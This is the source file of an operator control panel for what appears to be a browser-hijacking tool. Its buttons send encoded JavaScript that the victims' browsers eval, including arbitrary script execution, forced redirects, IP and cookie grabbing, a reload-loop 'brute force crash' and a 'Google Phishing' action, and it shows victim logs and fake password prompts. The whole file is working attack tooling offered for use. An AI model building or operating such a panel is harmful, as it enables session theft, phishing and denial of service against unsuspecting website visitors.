<?php
session_start();

// Check if the user is logged in
if (!isset($_SESSION["logged_in"]) || !$_SESSION["logged_in"]) {
    // Redirect to the login page if not logged in
    header("Location: login.php");
    exit();
}
?>
<!DOCTYPE html>
<html>
  <head>
    <link rel="icon" href="favicon2.ico">
<style>
  *{
    color: green;
    background-color: black;
    border-width:2px;
    border-color: darkgreen;
  }
  ::placeholder {
  color: green;
  opacity: 1; /* Firefox */
}

:-ms-input-placeholder { /* Internet Explorer 10-11 */
 color: green;
}

::-ms-input-placeholder { /* Microsoft Edge */
 color: green;
}
fieldset{
  font-family: monospace;
}
</style>
</head><body>
<div id="commands">
<input placeholder="Type message..." id="display">
<button onclick="displayValue(document.querySelector('#display').value)">Display Message</button><br>
<input placeholder="Type message..." id="reply">
<button onclick="displayReply(document.querySelector('#reply').value)">Display Message with reply</button><br>
<input placeholder="Type url..." id="redirect">
<button onclick="redirectTo(document.querySelector('#redirect').value)">Redirect to Url (Iframe)</button><br>
<input placeholder="Type url..." id="redirect2">
<button onclick="displayJS('location.href = `' + document.querySelector('#redirect2').value + '`;')">Redirect to Url (Real)</button><br>  
<textarea placeholder="Type html..." id="displayHTML"></textarea>
<button onclick="displayHTML(btoa(document.querySelector('#displayHTML').value))">Display html</button><br>
<textarea placeholder="Type JS..." id="displayJS"></textarea>
<button onclick="displayJS(document.querySelector('#displayJS').value)">Execute JS</button><br>
<button onclick="displayJS('getIP();')">Get IP</button><br>
<button onclick="displayJS('window.location.reload();')">Reload user</button><br>
<button onclick="crash()">Brute force crash</button><br>
  <button onclick="getCookies()">Get cookies 🍪</button><br>
  
<button onclick="phish()">Google Phishing</button><br>

<button id="detailbtn" onclick="show()">Show details</button><br>
<button onclick="download()">Download logs</button><br>
<button onclick="clearLogs()">Clear logs</button><br>
</div>
<div id="details" style="display: none;"></div>
<div id="logs">

</div>

<script>
    function appendLog(log){
      var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    }
  };
  xhttp.open("GET", "addlog.php?value=" + btoa(log), true);
  xhttp.send();
  }
  
  function appendValue(value) {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
appendLog("Request sent for script...");
    }
  };
  xhttp.open("GET", "appendValue.php?value=" + value, true);
  xhttp.send();
  }
    function phish() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
appendLog("Request sent to phish...");
    }
  };
  xhttp.open("GET", "phish.php", true);
  xhttp.send();
  }
    function showValue(value) {
console.log(value);
  }
  
  function displayValue(value){
    appendValue(btoa('alert(atob("' + btoa(value) + '"))'));
  }
    function displayReply(value){
    appendValue(btoa('message(atob("' + btoa(value) + '"))'));
  }
  
  function redirectTo(url){
    appendValue(btoa('redirectTo(atob("' + btoa(url) + '"))'));
  }
  
  function displayHTML(code){
    appendValue(btoa('displayHTML(atob("' + btoa(code) + '"))'));
  }
  function displayJS(code){
    appendValue(btoa('eval(atob("' + btoa(code) + '"))'));
  }
  function crash(){
    displayJS("while(true){window.location.reload();}");
  }
  function getCookies(){
    displayJS("getCookies();");
  }

var logs;
var script1 = "";
var script2 = "";
var shouldRun;
var bool;
setInterval(async function(){
shouldRun = true;
let x = await fetch("logs.txt");
let y = await x.text();
script2 = y;
  if(script2 == script1){
    shouldRun = false;
  } else {
      script1 = y;
  }
  if(script1 == ""){
    shouldRun = false;
  }
  if(shouldRun == true){
    document.querySelector("#logs").innerHTML = "";
    logs = eval(y);
    for(var i = 0; i < logs.length; i++){
      var log = atob(logs[i]);
      document.querySelector("#logs").innerHTML += "<fieldset><legend></legend>" + log +"</fieldset>";
    }
  }
}, 1000);
  function start(){
  setInterval(function(){
  for(var j = 0; j < logs.length; j++){
      var log = atob(logs[j]);
      if(log.includes("Error") && !log.includes("ip") && !log.includes("Message") && !log.includes("Password")){
        document.querySelectorAll("legend")[j].style.borderColor = "rgb(200, 0, 0)";
        document.querySelectorAll("fieldset")[j].style.color = "rgb(200, 0, 0)";
        document.querySelectorAll("fieldset")[j].style.borderColor = "rgb(200, 0, 0)";
      }
    }
  }, 100);
  }
  async function getLogs(){
    shouldRun = true;
let x = await fetch("logs.txt");
let y = await x.text();
script2 = y;
  if(script2 == script1){
    shouldRun = false;
  } else {
      script1 = y;
  }
  if(script1 == ""){
    shouldRun = false;
  }
  if(shouldRun == true){
    document.querySelector("#logs").innerHTML = "";
    logs = eval(y);
    for(var i = 0; i < logs.length; i++){
      var log = atob(logs[i]);
      document.querySelector("#logs").innerHTML += "<fieldset><legend></legend>" + log +"</fieldset>";
    }
  }
    start();
  }
  getLogs();
async function getDetails(){
let x = await fetch("agent.txt");
let y = await x.text();
document.querySelector("#details").innerHTML = atob(y);
}
getDetails();

function show(){
  document.querySelector("#details").style.display = 'block';
  document.querySelector("#detailbtn").onclick = hide;
  document.querySelector("#detailbtn").innerHTML = "Hide details";
}

function hide(){
    document.querySelector("#details").style.display = 'none';
  document.querySelector("#detailbtn").onclick = show;
  document.querySelector("#detailbtn").innerHTML = "Show details";
}
  function download() {
  var outerHTML = document.querySelector("style").outerHTML + document.querySelector("#logs").outerHTML;
  var fileName = "outerHTML.html";
  var downloadLink = document.createElement("a");
  downloadLink.href = "data:text/html;charset=utf-8," + encodeURIComponent(outerHTML);
  downloadLink.download = fileName;
  downloadLink.click();
}

function clearLogs(){
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
  alert("Cleared logs successfully!");
      }
    };
    xhttp.open("GET", "clearLogs.php", true);
    xhttp.send();
}

  function wrongPassword(){
var message = "Incorrect password!";
var spaces = Math.ceil(Math.random() * 6);
for(var i = 0; i < spaces; i++){
  message = message + " ";
}
displayValue(message + "Please try again.");
}

function correctPassword(){
var js =`
alert('Correct password!! Continuing to site...');
document.querySelector("#access-frame").style.display="none";
document.querySelector("#access-frame").srcdoc="";
`;

displayJS(js);
}
</script>
</body>
</html>